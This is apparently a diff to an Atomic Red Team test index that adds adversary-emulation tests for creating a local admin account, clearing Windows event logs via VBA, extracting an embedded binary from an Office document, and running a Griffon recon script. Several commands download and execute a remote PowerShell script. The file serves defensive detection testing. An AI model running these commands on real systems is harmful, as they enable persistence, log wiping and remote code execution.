@@ -4166,7 +4166,24 @@ privilege-escalation:
       - Linux
       - macOS
       - Windows
-    atomic_tests: []
+      identifier: T1078.003
+    atomic_tests:
+    - name: Create local account with admin priviliges
+      auto_generated_guid: a524ce99-86de-4db6-b4f9-e08f35a47a15
+      description: After execution the new account will be active and added to the
+        Administrators group
+      supported_platforms:
+      - windows
+      executor:
+        command: |-
+          net user art-test /add
+          net user art-test Password123!
+          net localgroup administrators art-test /add
+        cleanup_command: |-
+          net localgroup administrators art-test /delete >nul 2>&1
+          net user art-test /delete >nul 2>&1
+        name: command_prompt
+        elevation_required: true
   T1037.002:
     technique:
       external_references:
@@ -13398,7 +13415,24 @@ persistence:
       - Linux
       - macOS
       - Windows
-    atomic_tests: []
+      identifier: T1078.003
+    atomic_tests:
+    - name: Create local account with admin priviliges
+      auto_generated_guid: a524ce99-86de-4db6-b4f9-e08f35a47a15
+      description: After execution the new account will be active and added to the
+        Administrators group
+      supported_platforms:
+      - windows
+      executor:
+        command: |-
+          net user art-test /add
+          net user art-test Password123!
+          net localgroup administrators art-test /add
+        cleanup_command: |-
+          net localgroup administrators art-test /delete >nul 2>&1
+          net user art-test /delete >nul 2>&1
+        name: command_prompt
+        elevation_required: true
   T1037.002:
     technique:
       external_references:
@@ -26845,6 +26879,34 @@ defense-evasion:
           Get-EventLog -list
         name: powershell
         elevation_required: true
+    - name: Clear Event Logs via VBA
+      auto_generated_guid: 1b682d84-f075-4f93-9a89-8a8de19ffd6e
+      description: "This module utilizes WMI via VBA to clear the Security and Backup
+        eventlogs from the system. \n\nElevation is required for this module to execute
+        properly, otherwise WINWORD will throw an \"Access Denied\" error\n"
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Microsoft Word must be installed
+
+'
+        prereq_command: |
+          try {
+            New-Object -COMObject "Word.Application" | Out-Null
+            Stop-Process -Name "winword"
+            exit 0
+          } catch { exit 1 }
+        get_prereq_command: 'Write-Host "You will need to install Microsoft Word manually
+          to meet this requirement"
+
+'
+      executor:
+        command: |
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt" -officeProduct "Word" -sub "ClearLogs"
+        name: powershell
+        elevation_required: true
   T1078.004:
     technique:
       id: attack-pattern--f232fa7a-025c-4d43-abc7-318e81a73d65
@@ -30905,7 +30967,46 @@ defense-evasion:
       - Linux
       - macOS
       - Windows
-    atomic_tests: []
+      identifier: T1564
+    atomic_tests:
+    - name: Extract binary files via VBA
+      auto_generated_guid: 6afe288a-8a8b-4d33-a629-8d03ba9dad3a
+      description: "This module extracts a binary (calc.exe) from inside of another
+        binary. \n\nIn the wild maldoc authors will use this technique to hide binaries
+        inside of files stored \nwithin the office document itself. An example of
+        this technique can be seen in sample\n\nf986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226\n\nThis
+        sample contains a document inside of itself. Document 1 is the actual maldoc
+        itself, document 2\nis the same document without all the malicious code. Document
+        1 will copy Document 2 to the file system\nand then \"peek\" inside of this
+        document and pull out the oleObject.bin file. Contained inside of this\noleObject.bin
+        file is a payload that is parsed out and executed on the file system.\n"
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Microsoft Word must be installed
+
+'
+        prereq_command: |
+          try {
+            New-Object -COMObject "Word.Application" | Out-Null
+            Stop-Process -Name "winword"
+            exit 0
+          } catch { exit 1 }
+        get_prereq_command: 'Write-Host "You will need to install Microsoft Word manually
+          to meet this requirement"
+
+'
+      executor:
+        command: |
+          $macro = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1564\src\T1564-macrocode.txt")
+          $macro = $macro -replace "aREPLACEMEa", "PathToAtomicsFolder\T1564\bin\extractme.bin"
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap
+        cleanup_command: 'Remove-Item "$env:TEMP\extracted.exe" -ErrorAction Ignore
+
+'
+        name: powershell
   T1574:
     technique:
       external_references:
@@ -32933,7 +33034,24 @@ defense-evasion:
       - Linux
       - macOS
       - Windows
-    atomic_tests: []
+      identifier: T1078.003
+    atomic_tests:
+    - name: Create local account with admin priviliges
+      auto_generated_guid: a524ce99-86de-4db6-b4f9-e08f35a47a15
+      description: After execution the new account will be active and added to the
+        Administrators group
+      supported_platforms:
+      - windows
+      executor:
+        command: |-
+          net user art-test /add
+          net user art-test Password123!
+          net localgroup administrators art-test /add
+        cleanup_command: |-
+          net localgroup administrators art-test /delete >nul 2>&1
+          net user art-test /delete >nul 2>&1
+        name: command_prompt
+        elevation_required: true
   T1127.001:
     technique:
       external_references:
@@ -47145,6 +47263,26 @@ discovery:
 
 '
         name: command_prompt
+    - name: Griffon Recon
+      auto_generated_guid: 69bd4abe-8759-49a6-8d21-0f15822d6370
+      description: "Griffon is a sophisticated tool believed to be in use by one of
+        more \"APT\" groups.  This atomic is for detecting, specifically, the reconnaissance
+        part of the tool.\nThis script used here was reduced by security researcher
+        Kirk Sayre (github.com/kirk-sayre-work/1a9476e7708ed650508f9fb5adfbad9d),
+        \nand it gives the exact same recon behavior as the original (minus the C2
+        interaction).  \nFor more information see also e.g. https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon
+        and https://attack.mitre.org/software/S0417/"
+      supported_platforms:
+      - windows
+      input_arguments:
+        vbscript:
+          description: Path to sample script
+          type: String
+          default: PathToAtomicsFolder\T1595.002\src\griffon_recon.vbs
+      executor:
+        command: 'cscript #{vbscript}'
+        name: powershell
+        elevation_required: false
   T1016:
     technique:
       id: attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0
@@ -60977,7 +61115,24 @@ initial-access:
       - Linux
       - macOS
       - Windows
-    atomic_tests: []
+      identifier: T1078.003
+    atomic_tests:
+    - name: Create local account with admin priviliges
+      auto_generated_guid: a524ce99-86de-4db6-b4f9-e08f35a47a15
+      description: After execution the new account will be active and added to the
+        Administrators group
+      supported_platforms:
+      - windows
+      executor:
+        command: |-
+          net user art-test /add
+          net user art-test Password123!
+          net localgroup administrators art-test /add
+        cleanup_command: |-
+          net localgroup administrators art-test /delete >nul 2>&1
+          net user art-test /delete >nul 2>&1
+        name: command_prompt
+        elevation_required: true
   T1566:
     technique:
       id: attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b
